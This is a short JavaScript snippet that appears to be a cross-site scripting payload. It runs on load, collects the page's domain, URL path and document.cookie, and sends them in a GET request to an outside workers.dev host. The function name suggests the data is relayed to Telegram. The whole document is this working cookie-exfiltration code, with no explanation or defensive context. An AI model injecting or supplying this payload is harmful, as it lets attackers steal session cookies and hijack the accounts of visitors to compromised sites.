function telegramSend() {
    var textData = 'XSS+Alert+in+' + document.domain + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-%0d%0a<pre>' + document.location.hostname + document.location.pathname + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document.cookie + '</pre>';
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://xxxpkxxx.xaxeci9852.workers.dev/?message=' + textData, true);
    xhr.send();
}
telegramSend();
